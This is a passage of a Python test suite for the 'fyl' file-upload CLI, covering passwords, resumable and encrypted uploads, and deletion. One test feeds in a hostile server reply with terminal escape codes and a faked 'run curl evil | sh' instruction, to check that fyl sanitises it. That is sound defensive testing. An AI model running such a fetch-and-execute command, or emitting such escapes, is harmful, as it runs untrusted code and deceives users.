        for vector in json.loads(vectors.read_text()):
            password = vector['input']
            # An environment value can hold neither NUL nor a lone surrogate; neither is a valid password.
            if '\0' in password or any(0xD800 <= ord(c) <= 0xDFFF for c in password):
                self.assertFalse(vector['valid'], vector)
                continue
            result = self.run_cli(file, '--password', env={'FYL_PASSWORD': password})
            if vector['valid']:
                self.assertEqual((result.returncode, result.stdout, result.stderr), (0, PROTECTED + '\n', ''), vector)
                self.assertEqual(self.state.metadata['password'], password, vector)
                accepted += 1
            else:
                self.assertEqual((result.returncode, result.stdout), (2 if re.search(r'[\x00-\x1f\x7f-\x9f]', password) else 1, ''), vector)
        self.assertGreater(accepted, 0)

    def test_a_protected_upload_resumes_without_its_password(self):
        file, secret = self.fixture(), 'tide-lamp-moss-41'
        err, command, token = self.interrupted(file, '--password', '--json', env={'FYL_PASSWORD': secret})
        self.assertNotIn(secret, err)
        self.assertNotIn('--password', command)
        # A resumed upload can't gain, change or lose its password.
        sent = len(self.state.requests)
        refused = self.run_cli(file, '--resume', token, '--password', env={'FYL_PASSWORD': secret})
        self.assertEqual((refused.returncode, refused.stdout), (2, ''))
        self.assertEqual(refused.stderr, 'fyl: A resumed upload keeps its password setting. Leave out --password, or start a new upload.\n')
        self.assertEqual(len(self.state.requests), sent)
        # The printed command needs no password and no terminal; the server says the upload is protected.
        resumed = self.rerun(command)
        self.assertEqual(resumed.returncode, 0, resumed.stderr)
        self.assertEqual(json.loads(resumed.stdout)['url'], PROTECTED)
        self.assertIs(json.loads(resumed.stdout)['protected'], True)
        self.assertNotIn('password', json.loads(resumed.stdout))

    def test_a_server_without_passwords_gets_no_file(self):
        self.state.early_url = False
        result = self.run_cli(self.fixture(), '--password', env={'FYL_PASSWORD': 'tide-lamp-moss-41'})
        self.assertEqual((result.returncode, result.stdout), (1, ''))
        self.assertEqual(result.stderr, "fyl: This server doesn't support download passwords. Nothing was uploaded.\n")
        self.assertEqual([path for path, _, _ in self.state.requests], ['/init', '/abort'])

    def test_a_typed_password_is_asked_twice_and_never_shown(self):
        file, secret = self.fixture(), 'tide pool 42'
        result, shown, echo = self.run_tty(file, [(PROMPT, secret + '\r'), (REPEAT, secret + '\r')], '--json')
        self.assertEqual(result.returncode, 0, result.stderr)
        # The terminal shows the prompts only: fyl turned its echo off for the answers, and on again.
        self.assertEqual((shown, echo), (PROMPT + '\r\n' + REPEAT + '\r\n', True))
        self.assertEqual(result.stderr, '')
        self.assertEqual(self.state.metadata['password'], secret)
        self.assertEqual({key: value for key, value in json.loads(result.stdout).items() if key in ('url', 'protected', 'password')},
                         {'url': PROTECTED, 'protected': True})
        sent = len(self.state.requests)
        result, shown, _ = self.run_tty(file, [(PROMPT, secret + '\r'), (REPEAT, 'tide pool 24\r')])
        self.assertEqual((result.returncode, result.stdout, result.stderr), (2, '', 'fyl: The passwords don’t match.\n'))
        self.assertEqual(len(self.state.requests), sent)
        # The server judges the length, once both prompts were answered.
        result, shown, _ = self.run_tty(file, [(PROMPT, 'short\r'), (REPEAT, 'short\r')])
        self.assertEqual((result.returncode, result.stdout, result.stderr), (1, '', REFUSED))
        self.assertEqual([path for path, _, _ in self.state.requests[sent:]], ['/init'])

    def test_enter_generates_a_password_and_prints_it(self):
        file = self.fixture()
        result, shown, _ = self.run_tty(file, [(PROMPT, '\r')], '--json')
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertEqual(shown, PROMPT + '\r\n')
        # Printed on stderr right away, so an interrupted upload doesn't lose it, and in the JSON.
        generated = re.fullmatch('Password: ({})\n'.format(GENERATED), result.stderr).group(1)
        self.assertEqual(self.state.metadata['password'], generated)
        receipt = json.loads(result.stdout)
        self.assertEqual((receipt['protected'], receipt['password']), (True, generated))
        # Quiet mode prints it too, and every run generates another.
        quiet, _, _ = self.run_tty(file, [(PROMPT, '\r')])
        self.assertEqual((quiet.returncode, quiet.stdout), (0, PROTECTED + '\n'), quiet.stderr)
        self.assertRegex(quiet.stderr, '^Password: {}\n$'.format(GENERATED))
        self.assertNotEqual(quiet.stderr, result.stderr)

    @unittest.skipUnless(Path('/dev/full').exists(), 'no /dev/full')
    def test_a_generated_password_nobody_can_see_uploads_nothing(self):
        # A file behind a password nobody saw would be lost: a full stderr stops fyl before anything is sent, also
        # with --json, which prints the password only once the upload is done.
        for args in [(), ('--json',)]:
            with open('/dev/full', 'w') as device:
                result, shown, echo = self.run_tty(self.fixture(), [(PROMPT, '\r')], *args, stderr=device)
            self.assertEqual((result.returncode, result.stdout, shown, echo), (74, '', PROMPT + '\r\n', True), args)
        self.assertEqual(self.state.requests, [])

    def test_ctrl_c_at_the_password_prompt_restores_the_terminal(self):
        result, shown, echo = self.run_tty(self.fixture(), [(PROMPT, 'half typed\x03')])
        self.assertEqual((result.returncode, result.stdout, result.stderr), (-signal.SIGINT, '', ''))
        self.assertNotIn('half typed', shown)
        self.assertTrue(echo)
        self.assertEqual(self.state.requests, [])

    def test_workers_go_up_to_eight(self):
        file = self.fixture()
        for workers in ['0', '9', 'four']:
            result = self.run_cli(file, '--workers', workers)
            self.assertEqual((result.returncode, result.stdout), (2, ''), workers)
            self.assertIn('--workers: choose a number from 1 to 8.', result.stderr)
        self.assertEqual(self.state.requests, [])
        result = self.run_cli(file, '--workers', '8')
        self.assertEqual((result.returncode, result.stdout), (0, LINK + '\n'), result.stderr)

    def test_parts_are_verified_by_their_etag(self):
        self.state.corrupt = 1
        healed = self.run_cli(self.fixture())
        self.assertEqual((healed.returncode, healed.stdout), (0, LINK + '\n'))
        self.assertEqual(sum(r[0] == '/part' for r in self.state.requests), 2, 'a damaged part is sent again')

    def test_etags_that_are_not_an_md5_count_only_on_this_machine(self):
        # The local R2 simulator returns opaque ETags, which can't be checked. They count for an API on this machine
        # only (local compatibility); anywhere else such a part is sent again and then stops the upload, resumable, as
        # the Rust test only_an_md5_etag_proves_a_part_except_on_this_machine shows (a test server here can't be remote).
        self.state.opaque = True
        result = self.run_cli(self.fixture(), '--verbose')
        self.assertEqual((result.returncode, result.stdout), (0, LINK + '\n'), result.stderr)
        self.assertEqual(sum(r[0] == '/part' for r in self.state.requests), 1)
        self.assertIn('[1/1] Part uploaded and verified', result.stderr)
        self.assertNotIn('sending the part again', result.stderr)

    def test_a_resumed_upload_keeps_opaque_etags_from_this_machine(self):
        # Resuming checks each finished part again; the local simulator's ETag counts here too, so nothing is sent twice.
        content = b'fyl.at fixture'
        file = self.fixture(content)
        self.state.opaque, self.state.mutate = True, file
        result = self.run_cli(file)
        self.assertEqual((result.returncode, result.stdout), (1, ''))
        self.assertIn('file changed', result.stderr)
        self.state.mutate = None
        file.write_bytes(content)
        sent = sum(r[0] == '/part' for r in self.state.requests)
        resumed = self.rerun(self.resume_command(result.stderr)[0].replace(' --resume -', ' --resume - --verbose'))
        self.assertEqual((resumed.returncode, resumed.stdout), (0, LINK + '\n'), resumed.stderr)
        self.assertIn('Resuming: 1 of 1 parts already uploaded', resumed.stderr)
        self.assertEqual(sum(r[0] == '/part' for r in self.state.requests), sent)

    def test_a_part_damaged_twice_keeps_the_upload_resumable(self):
        self.state.corrupt = 2
        result = self.run_cli(self.fixture(), '--verbose')
        self.assertEqual((result.returncode, result.stdout), (1, ''))
        self.assertIn('arrived corrupted twice', result.stderr)
        # Sent once more, not a third time: only the first mismatch says so.
        self.assertEqual(result.stderr.count('[1/1] Checksum mismatch, sending the part again\n'), 1, result.stderr)
        self.assertEqual(sum(r[0] == '/abort' for r in self.state.requests), 0)
        # The server recorded the damaged part's ETag; resuming finds the mismatch and sends the part again.
        resumed = self.rerun(self.resume_command(result.stderr)[0])
        self.assertEqual((resumed.returncode, resumed.stdout), (0, LINK + '\n'), resumed.stderr)
        self.assertEqual(sum(r[0] == '/part' for r in self.state.requests), 3)

    def test_changed_file_keeps_the_upload_resumable(self):
        content = b'fyl.at fixture'
        file = self.fixture(content)
        self.state.mutate = file
        result = self.run_cli(file)
        self.assertEqual((result.returncode, result.stdout), (1, ''))
        self.assertIn('file changed', result.stderr)
        self.assertFalse(self.state.completed)
        self.assertFalse(any(r[0] == '/abort' for r in self.state.requests))
        # Back to its content, the file still matches the uploaded part, so resuming sends nothing again.
        self.state.mutate = None
        file.write_bytes(content)
        sent = sum(r[0] == '/part' for r in self.state.requests)
        resumed = self.rerun(self.resume_command(result.stderr)[0])
        self.assertEqual((resumed.returncode, resumed.stdout), (0, LINK + '\n'), resumed.stderr)
        self.assertEqual(sum(r[0] == '/part' for r in self.state.requests), sent)

    def test_invalid_input_never_contacts_the_api(self):
        huge = self.root / 'huge.img'
        with open(huge, 'wb') as sparse:
            sparse.truncate(50 * 1024 ** 3 + 1)
        # A folder that holds nothing to send is refused like an empty file.
        for file in [self.root / 'missing', self.fixture(b''), self.folder('nothing'), huge]:
            result = self.run_cli(file)
            self.assertEqual((result.returncode, result.stdout), (2, ''), result.stderr)
            self.assertTrue(result.stderr.startswith('fyl: '))
        self.assertIn('larger than 50 GB', result.stderr)
        file = self.fixture()
        for lifetime in ['4m', '8d', '1.5d', '999999d', 'h']:
            result = self.run_cli(file, '--expires', lifetime)
            self.assertEqual(result.returncode, 2, lifetime)
            self.assertIn('--expires', result.stderr)
        # Switches take no value: --once=false must not make a one-time link.
        for switch in ['--once=false', '--json=1', '--manage=no']:
            result = self.run_cli(file, switch)
            self.assertEqual(result.returncode, 2, switch)
            self.assertIn('fyl: {} takes no value.'.format(switch.split('=')[0]), result.stderr)
        self.assertEqual(self.run_cli(file, '--endpoint', 'http://fyl.at/api/upload').returncode, 2)
        self.assertEqual(self.run_cli(file, '--bogus').returncode, 2)
        self.assertEqual(self.state.requests, [])

    def test_rm_deletes_with_the_management_link(self):
        link = '{}/#manage/{}/{}'.format(self.origin, TRANSFER_ID, OWNER_KEY)
        # Rate limits and server errors are retried.
        self.state.failures = {'/api/transfers/' + TRANSFER_ID: [503, 429]}
        result = self.run_raw('rm', link)
        self.assertEqual((result.returncode, result.stdout, result.stderr), (0, 'Deleted report.zip.\n', ''))
        self.assertTrue(self.state.deleted)
        # `-` reads the link from stdin, out of the process list.
        again = self.run_raw('rm', '-', input=link + '\n')
        self.assertEqual(again.returncode, 1)
        self.assertIn('already gone', again.stderr)
        wrong = self.run_raw('rm', '{}/#manage/{}/{}'.format(self.origin, TRANSFER_ID, 'x' * 43))
        self.assertEqual(wrong.returncode, 1)
        self.assertIn('not valid', wrong.stderr)

    def test_rm_deletes_a_file_under_review(self):
        # While a report is reviewed the owner gets no info (403 quarantined), but may still delete the file.
        link = '{}/#manage/{}/{}'.format(self.origin, TRANSFER_ID, OWNER_KEY)
        self.state.quarantined = True
        wrong = self.run_raw('rm', '{}/#manage/{}/{}'.format(self.origin, TRANSFER_ID, 'x' * 43))
        self.assertEqual((wrong.returncode, wrong.stdout, wrong.stderr), (1, '', 'fyl: That management link is not valid for this upload.\n'))
        result = self.run_raw('rm', link)
        self.assertEqual((result.returncode, result.stdout, result.stderr), (0, 'Deleted the file.\n', ''))
        self.assertTrue(self.state.deleted)
        self.assertEqual([method for _, method, _ in self.state.requests], ['GET', 'GET', 'DELETE'])
        # Should the service refuse the deletion too, fyl says why, not that the link is wrong.
        self.state.deleted = False
        self.state.failures = {'/api/transfers/' + TRANSFER_ID: [(403, 'quarantined'), (403, 'quarantined')]}
        refused = self.run_raw('rm', link)
        self.assertEqual((refused.returncode, refused.stdout, refused.stderr),
                         (1, '', 'fyl: The service did not delete this upload: a report about it is under review.\n'))
        self.assertFalse(self.state.deleted)
        self.assertEqual([method for _, method, _ in self.state.requests[3:]], ['GET', 'DELETE'])

    def test_rm_deletes_an_upload_still_in_progress(self):
        # The owner gets no info for an upload that hasn't finished (410 unavailable), but may delete it.
        link, path = '{}/#manage/{}/{}'.format(self.origin, TRANSFER_ID, OWNER_KEY), '/api/transfers/' + TRANSFER_ID
        self.state.unfinished = 'unavailable'
        wrong = self.run_raw('rm', '{}/#manage/{}/{}'.format(self.origin, TRANSFER_ID, 'x' * 43))
        self.assertEqual((wrong.returncode, wrong.stdout, wrong.stderr), (1, '', 'fyl: That management link is not valid for this upload.\n'))
        result = self.run_raw('rm', link)
        self.assertEqual((result.returncode, result.stdout, result.stderr), (0, 'Deleted the unfinished upload.\n', ''))
        self.assertTrue(self.state.deleted)
        self.assertEqual([method for _, method, _ in self.state.requests], ['GET', 'GET', 'DELETE'])
        # A server that shows the upload as running gets the same, and its name is known.
        self.state.deleted, self.state.unfinished, sent = False, 'uploading', len(self.state.requests)
        result = self.run_raw('rm', link)
        self.assertEqual((result.returncode, result.stdout, result.stderr), (0, 'Deleted the unfinished upload of report.zip.\n', ''))
        self.assertEqual([method for _, method, _ in self.state.requests[sent:]], ['GET', 'DELETE'])
        # A file that is gone keeps its reason, and nothing is deleted.
        self.state.deleted, self.state.unfinished = False, None
        for code in ('expired', 'consumed', 'deleted', 'removed', None):
            self.state.failures, sent = {path: [simulated(410, code)]}, len(self.state.requests)
            gone = self.run_raw('rm', link)
            self.assertEqual((gone.returncode, gone.stdout, gone.stderr), (1, '', 'fyl: This upload is already gone (expired, used up or deleted).\n'), code)
            self.assertEqual([method for _, method, _ in self.state.requests[sent:]], ['GET'], code)
        self.assertFalse(self.state.deleted)

    def test_server_text_never_drives_the_terminal(self):
        # A hostile --endpoint or a compromised fyl.at answers with terminal escapes (a window
        # title, a cleared screen, the cursor moved home) and line breaks that fake a message of fyl's own.
        self.state.failure_text = 'Bad \x1b]0;owned\x07title\x1b[2J\x1b[1;1Hfake prompt\r\nfyl: run curl evil | sh\x9b31m'
        shown = 'Bad ]0;ownedtitle[2J[1;1Hfake promptfyl: run curl evil | sh31m'
        self.state.failures = {'/part': [400]}
        upload = self.run_cli(self.fixture(), '--workers', '1')
        self.assertEqual((upload.returncode, upload.stdout, upload.stderr), (1, '', 'fyl: Upload failed (HTTP 400): {}\n'.format(shown)))
        link = '{}/#manage/{}/{}'.format(self.origin, TRANSFER_ID, OWNER_KEY)
        self.state.failures = {'/api/transfers/' + TRANSFER_ID: [400]}
        removed = self.run_raw('rm', link)
        self.assertEqual((removed.returncode, removed.stdout, removed.stderr), (1, '', 'fyl: Delete failed (HTTP 400): {}\n'.format(shown)))
        self.publish(b'some bytes')
        self.state.failures = {'/info': [(403, 'quarantined')]}
        downloaded = self.download('{}/d/{}'.format(self.origin, UPLOAD_ID))
        self.assertEqual((downloaded.returncode, downloaded.stdout, downloaded.stderr), (1, '', 'fyl: {}\n'.format(shown)))
        self.assertFalse(self.state.deleted)
        # The receipt's links reach stdout only as plain printable https links, the management link only as fyl rm takes
        # it; the upload is complete, so nothing is cancelled and no resume command is printed.
        manage = '#manage/{}/{}'.format(UPLOAD_ID, OWNER_KEY)
        for url, management in [(PROTECTED + '/bad\x1b]0;owned\x07.zip', None), (PROTECTED + '/two words.zip', None), (PROTECTED + '/caf\u00e9.zip', None),
                                (PROTECTED + '/x\u009b31m.zip', None), (None, MANAGE + '\x1b[2J'), (None, 'https://fyl.at/#manage/x/y'),
                                (None, 'http://fyl.example/' + manage), (None, 'https://user@fyl.at/' + manage)]:
            for args in [('--manage',), ('--manage', '--json')]:
                self.reset()
                self.state.receipt_url, self.state.management_url = url, management
                result = self.run_cli(self.fixture(), *args)
                self.assertEqual((result.returncode, result.stdout, result.stderr),
                                 (1, '', "fyl: The server sent a link that isn't a plain https link, so fyl shows none.\n"), (url, management))
                self.assertTrue(self.state.completed)
                self.assertNotIn('/abort', self.paths())
        # Without --manage the management link isn't shown, so it isn't judged either.
        self.reset()
        self.state.management_url = MANAGE + '\x1b[2J'
        result = self.run_cli(self.fixture())
        self.assertEqual((result.returncode, result.stdout), (0, LINK + '\n'), result.stderr)
        # The receipt's name reaches --json without the control characters JSON doesn't escape (DEL, C1 such as CSI).
        self.reset()
        self.state.receipt_name = 'report\x9b2J\x7f\x1b.zip'
        result = self.run_cli(self.fixture(), '--json')
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertEqual(json.loads(result.stdout)['name'], 'report2J.zip')
        self.assertFalse(set(result.stdout) & {'\x9b', '\x7f', '\x1b'}, result.stdout)

    def test_fyl_ua_suffix_marks_own_checks_in_the_user_agent(self):
        # scripts/smoke.py and mac-check.sh set FYL_UA_SUFFIX=fyl-smoke, so the statistics count their transfers as fyl's own.
        def agents():
            return {re.search(rb'\nUser-Agent: ([^\r\n]*)', request, re.I).group(1).decode() for request in self.state.wire}
        cases = [('fyl-smoke', 'fyl-cli/{} fyl-smoke'), (' fyl-ops/1.0 ', 'fyl-cli/{} fyl-ops/1.0'), ('two words', 'fyl-cli/{}'),
                 ('x' * 41, 'fyl-cli/{}'), (None, 'fyl-cli/{}')]
        for n, (suffix, agent) in enumerate(cases):
            self.reset()
            env = {'FYL_UA_SUFFIX': suffix} if suffix is not None else None
            result = self.run_cli(self.fixture(), env=env)
            self.assertEqual(result.returncode, 0, result.stderr)
            got = self.download('{}/d/{}'.format(self.origin, UPLOAD_ID), '-o', str(self.root / 'copy-{}'.format(n)), env=env)
            self.assertEqual(got.returncode, 0, got.stderr)
            self.assertEqual(agents(), {agent.format(VERSION)}, suffix)

    def test_rm_rejects_anything_but_a_management_link(self):
        for args in [('rm',), ('rm', 'https://fyl.at/d/abc/file.zip'), ('rm', 'http://example.com/#manage/{}/{}'.format(TRANSFER_ID, OWNER_KEY)),
                     ('rm', 'a', 'b'), ('rm', '-')]:
            result = self.run_raw(*args)
            self.assertEqual((result.returncode, result.stdout), (2, ''), args)
            self.assertTrue(result.stderr.startswith('fyl: '), args)
        self.assertEqual(self.state.requests, [])

    def test_packaged_checksums_cover_every_download(self):
        sums = dict(line.split()[::-1] for line in (CLI / 'SHA256SUMS').read_text().splitlines())
        self.assertEqual(sorted(sums), ['fyl-linux-arm64', 'fyl-linux-x86_64', 'fyl-macos-arm64', 'fyl-macos-x86_64'])
        for name, digest in sums.items():
            self.assertEqual(hashlib.sha256((CLI / name).read_bytes()).hexdigest(), digest, name)
        cargo = (ROOT / 'cli-rs' / 'Cargo.toml').read_text()
        self.assertIn('version = "{}"'.format(VERSION), cargo)

    # ---------------------------------------------------------------------------------------------
    # End-to-end encryption (docs/E2EE.md): uploads with --encrypt, fyl download, fyl decrypt

    def exposed(self):
        """What fyl says about a key that came after %23 in a link: it was in a request path to the fake."""
        return 'fyl: This key was sent to {} in the address. For sensitive files, upload again and share the new link.\n'.format(self.origin.split('//')[1])

    def keyed(self, text):
        """The keyed link an encrypted upload printed, `<origin>/d/<ID>#KEY`, and its KEY."""
        match = re.fullmatch(re.escape(self.origin) + '/d/' + UPLOAD_ID + '#([A-Za-z0-9_-]{43})', text.strip())
        self.assertIsNotNone(match, text)
        return match.group(0), match.group(1)

    def encrypted(self, content=b'fyl.at fixture', *args, env=None, file=None):
        """Uploads `content` with --encrypt; returns the file, its link and its key."""
        file = file or self.fixture(content)
        result = self.run_cli(file, '--encrypt', *args, env=env)
        self.assertEqual((result.returncode, result.stderr), (0, ''), result.stderr)
        return (file, *self.keyed(result.stdout))

    def download(self, link, *args, env=None, input='', cwd=None):
        return self.run_raw('download', link, '--endpoint', self.endpoint, *args, env=env, input=input, cwd=cwd or self.root)

    def publish(self, data, name='report.zip', mode='raw', password=None, once=False, **extra):
        """A transfer the fake serves on /d/ and its info route, as if uploaded."""
        self.state.transfer = {'mode': mode, 'data': data, 'name': name, 'password': password, 'once': once, **extra}

    def folder(self, name='out'):
        folder = self.root / name
        folder.mkdir(parents=True)
        return folder

    def paths(self):
        return [request[0] for request in self.state.requests]

    def sealed_resume(self, stderr):
        """The command and the value an interrupted encrypted upload printed last."""
        command, value = (line.strip() for line in stderr.strip().splitlines()[-2:])
        words = shlex.split(command)
        self.assertEqual((words[0], words[2:5]), ('fyl', ['--resume', '-', '--encrypt']), command)
        self.assertRegex(value, r'^{}\.[A-Za-z0-9_-]{{43}}\.[A-Za-z0-9_-]{{43}}\.-?[0-9]+$'.format(UPLOAD_ID))
        return command, value

    def test_encrypt_sends_only_ciphertext_and_prints_the_link_it_built(self):
        content = os.urandom(200_000)
        file, link, key = self.encrypted(content)
        init, stored = self.state.metadata, self.state.transfer['data']
        # §12.1: mode, the ciphertext size, head and meta; no name.
        self.assertEqual((init['mode'], init['size'], len(stored)), ('e2ee', ciphertext_size(len(content)), ciphertext_size(len(content))))
        self.assertNotIn('filename', init)
        self.assertEqual(stored[:184], unb64url(init['e2ee']['head']))
        self.assertEqual(len(unb64url(init['e2ee']['meta'])), 712)
        # The key, the name and the plaintext reached the server in no request.
        wire = b''.join(self.state.wire)
        for secret in (key.encode(), file.name.encode(), content[:32], content[-32:]):
            self.assertNotIn(secret, wire)
        # Pinned before it was sent, with Content-MD5 equal to the pin (§8.3).
        self.assertEqual([path for path in self.paths() if path in ('/pin', '/part')], ['/pin', '/part'])
        self.assertEqual(self.state.pins, {1: hashlib.md5(stored).hexdigest()})
        self.assertEqual(self.state.sent, [(1, hashlib.sha256(stored).hexdigest(), base64.b64encode(hashlib.md5(stored).digest()).decode())])
        # fyl download decrypts it under its own name and leaves nothing else behind.
        out = self.folder()
        got = self.download(link, '-o', str(out))
        self.assertEqual((got.returncode, got.stdout, got.stderr), (0, '{}\n'.format(out / file.name), ''))
        self.assertEqual(((out / file.name).read_bytes(), os.listdir(out)), (content, [file.name]))
        # fyl decrypt opens the ciphertext as curl saves it (fyl-<ID[0:8]>.age), with the key or the whole link.
        saved = self.root / 'fyl-{}.age'.format(UPLOAD_ID[:8])
        saved.write_bytes(stored)
        for value, output in [(key, self.root / 'fyl-{}'.format(UPLOAD_ID[:8])), (link, out / 'from-link')]:
            opened = self.run_raw('decrypt', str(saved), '--endpoint', self.endpoint, *(['-o', str(output)] if output.parent == out else []),
                                  env={'FYL_KEY': value})
            self.assertEqual((opened.returncode, opened.stdout, opened.stderr), (0, '{}\n'.format(output), ''))
            self.assertEqual(output.read_bytes(), content)

    def test_encrypted_parts_go_out_in_parallel_and_retries_resend_the_same_bytes(self):
        content = os.urandom(50 * 1024 * 1024 + 100_000)
        file = self.fixture(content)
        self.state.failures = {'/pin': [503], '/part': [503]}
        result = self.run_cli(file, '--encrypt', '--workers', '2', '--once', '--expires', '2h', '--json')
        self.assertEqual(result.returncode, 0, result.stderr)
        receipt = json.loads(result.stdout)
        link, _ = self.keyed(receipt['url'])
        self.assertEqual(receipt, {'url': link, 'name': file.name, 'size': len(content), 'expiresAt': '2026-10-26T07:33:20Z',
                                   'once': True, 'encrypted': True})
        self.assertEqual((self.state.metadata['expiresIn'], self.state.metadata['oneTime']), (7200, True))
        # Two parts of the ciphertext; the boundary falls inside a chunk (§6).
        size = ciphertext_size(len(content))
        self.assertEqual({n: len(blob) for n, blob in self.state.blobs.items()}, {1: 50 * 1024 * 1024, 2: size - 50 * 1024 * 1024})
        # Three part requests, one retried: every request of a part carried the same bytes, built once.
        self.assertEqual(len(self.state.sent), 3)
        for number in (1, 2):
            self.assertEqual(len({sent[1:] for sent in self.state.sent if sent[0] == number}), 1)
        got = self.download(link, '-o', str(self.folder() / 'copy.bin'))
        self.assertEqual(got.returncode, 0, got.stderr)
        self.assertEqual(hashlib.sha256((self.root / 'out' / 'copy.bin').read_bytes()).digest(), hashlib.sha256(content).digest())

    def test_an_encrypted_upload_takes_a_password_and_a_management_link(self):
        content, secret = b'protected and encrypted', 'tide-lamp-moss-41'
        file = self.fixture(content)
        result = self.run_cli(file, '--encrypt', '--password', '--manage', env={'FYL_PASSWORD': secret})
        self.assertEqual(result.returncode, 0, result.stderr)
        shown, management = result.stdout.splitlines()
        link, key = self.keyed(shown)
        self.assertEqual(management, MANAGE)
        self.assertEqual(self.state.metadata['password'], secret)
        out = self.folder()
        # Without the password nothing is released; a wrong one is refused on the info route.
        missing = self.download(link, '-o', str(out))
        self.assertEqual((missing.returncode, missing.stdout, missing.stderr),
                         (2, '', 'fyl: This file is protected. Type its password at a terminal, or set FYL_PASSWORD.\n'))
        wrong = self.download(link, '-o', str(out), env={'FYL_PASSWORD': 'not the password'})
        self.assertEqual((wrong.returncode, wrong.stdout, wrong.stderr), (1, '', 'fyl: Wrong password. 4 tries left.\n'))
        self.assertNotIn('/d/', self.paths())
        got = self.download(link, '-o', str(out), env={'FYL_PASSWORD': secret})
        self.assertEqual((got.returncode, got.stdout), (0, '{}\n'.format(out / file.name)), got.stderr)
        self.assertEqual((out / file.name).read_bytes(), content)
        # The password travels as Basic on the info route and the download, never in a link; the key in no request.
        downloads = [request[2] for request in self.state.requests if request[0] == '/d/']
        self.assertEqual(len(downloads), 1)
        self.assertEqual(downloads[0]['Authorization'], 'Basic ' + base64.b64encode(('fyl:' + secret).encode()).decode())
        self.assertNotIn(key.encode(), b''.join(self.state.wire))

    def test_no_part_goes_to_a_server_that_ignores_encryption_or_links_elsewhere(self):
        file = self.fixture()
        elsewhere = 'fyl: The server sent a link to another address than {}, so fyl shows none. Nothing was uploaded.\n'.format(self.origin)
        port = self.origin.rsplit(':', 1)[1]
        cases = [('echo_mode', False, "fyl: This server doesn't support encrypted uploads. Nothing was uploaded.\n"),
                 ('init_url', 'https://fyl.example/d/' + UPLOAD_ID, elsewhere),
                 ('init_url', 'https://127.0.0.1:{}/d/{}'.format(port, UPLOAD_ID), elsewhere),
                 ('init_url', '{}/d/{}/name.zip'.format(self.origin, UPLOAD_ID), elsewhere),
                 ('e2ee_disabled', True, "fyl: This server doesn't accept encrypted uploads. Nothing was uploaded.\n")]
        for setting, value, message in cases:
            self.reset()
            setattr(self.state, setting, value)
            result = self.run_cli(file, '--encrypt')
            self.assertEqual((result.returncode, result.stdout, result.stderr), (1, '', message), value)
            # Cancelled at once, before any pin or part; a disabled server opened no upload.
            self.assertEqual(self.paths(), ['/init'] + ([] if setting == 'e2ee_disabled' else ['/abort']), value)

    def test_a_receipt_with_a_foreign_link_shows_no_link(self):
        self.state.receipt_url = 'https://fyl.example/d/' + UPLOAD_ID
        result = self.run_cli(self.fixture(), '--encrypt', '--json')
        self.assertEqual((result.returncode, result.stdout),  (1, ''))
        self.assertEqual(result.stderr, 'fyl: The server sent a link to another address than {}, so fyl shows no link.\n'.format(self.origin))
        self.assertNotIn('/abort', self.paths())

    def test_a_part_stored_damaged_goes_out_once_more_then_the_upload_stops_resumable(self):
        self.state.part_corrupt = 1
        file, link, _ = self.encrypted()
        self.assertEqual(len(self.state.sent), 2)
        self.assertEqual(len(set(self.state.sent)), 1, 'the same bytes, the same Content-MD5')
        self.reset()
        self.state.part_corrupt = 2
        result = self.run_cli(file, '--encrypt', '--verbose')
        self.assertEqual((result.returncode, result.stdout), (1, ''))
        self.assertIn('[1/1] Checksum mismatch, sending the part again\n', result.stderr)
        self.assertIn('fyl: Part 1 arrived corrupted twice. Check your connection, then run the command below.\n', result.stderr)
        self.sealed_resume(result.stderr)
        self.assertEqual((len(self.state.sent), self.paths().count('/abort')), (2, 0))

    def test_a_changed_part_cancels_the_upload(self):
        self.state.failures = {'/pin': [(409, 'part_changed')]}
        result = self.run_cli(self.fixture(), '--encrypt')
        self.assertEqual((result.returncode, result.stdout, result.stderr), (1, '', CHANGED))
        self.assertEqual(self.paths(), ['/init', '/pin', '/abort'])

    def test_an_interrupted_encrypted_upload_resumes_with_the_value_pasted_on_stdin(self):
        content = os.urandom(50 * 1024 * 1024 + 5000)
        file = self.fixture(content)
        self.state.failures = {'/part': [200, 503, 503, 503]}
        first = self.run_cli(file, '--encrypt', '--workers', '1', '--json')
        self.assertEqual((first.returncode, first.stdout), (1, ''))
        self.assertIn('run the command below and paste the line under it when asked. Keep that line private: it holds the file\'s key',
                      first.stderr)
        command, value = self.sealed_resume(first.stderr)
        _, token, key, mtime = value.split('.')
        self.assertEqual(token, resume_token(self.state.metadata['clientKey']))
        self.assertEqual(int(mtime), file.stat().st_mtime_ns // 1_000_000)
        # The command holds neither the key nor the token: the value goes in on stdin, out of history and process list.
        self.assertNotIn(key, command)
        self.assertNotIn(token, command)
        self.assertTrue(command.endswith(" --resume - --encrypt --json --workers 1 --endpoint '{}'".format(self.endpoint)), command)
        sent = len(self.state.sent)
        resumed = self.rerun(command, input=value + '\n')
        self.assertEqual(resumed.returncode, 0, resumed.stderr)
        link, again = self.keyed(json.loads(resumed.stdout)['url'])
        self.assertEqual(again, key)
        self.assertEqual(len(self.state.sent) - sent, 1, 'only part 2 is sent again')
        self.assertEqual(self.paths().count('/abort'), 0)
        got = self.download(link, '-o', str(self.folder() / 'copy'))
        self.assertEqual(got.returncode, 0, got.stderr)
        self.assertEqual(hashlib.sha256((self.root / 'out' / 'copy').read_bytes()).digest(), hashlib.sha256(content).digest())

    def test_an_encrypted_resume_refuses_a_file_changed_since(self):
        content = b'fyl.at fixture, encrypted'
        file = self.fixture(content)
        self.state.failures = {'/part': [503, 503, 503]}
        command, value = self.sealed_resume(self.run_cli(file, '--encrypt').stderr)
        # The part was pinned before its body went out, so its bytes are fixed now.
        self.assertEqual(list(self.state.pins), [1])
        times = file.stat()
        sent = len(self.state.requests)
        # Touched: same content, another modification time.
        os.utime(file, ns=(times.st_atime_ns, times.st_mtime_ns + 5_000_000_000))
        refused = self.rerun(command, input=value + '\n')
        self.assertEqual((refused.returncode, refused.stdout, refused.stderr),
                         (2, '', 'fyl: The file changed since this upload started (its modification time differs). Start a new upload.\n'))
        # Changed in place, its modification time put back: the pin gives it away.
        file.write_bytes(content.upper())
        os.utime(file, ns=(times.st_atime_ns, times.st_mtime_ns))
        refused = self.rerun(command, input=value + '\n')
        self.assertEqual((refused.returncode, refused.stdout, refused.stderr), (2, '', CHANGED))
        # Refusals send nothing and cancel nothing; the unchanged file still resumes.
        self.assertEqual(self.paths()[sent:], ['/status', '/status'])
        file.write_bytes(content)
        os.utime(file, ns=(times.st_atime_ns, times.st_mtime_ns))
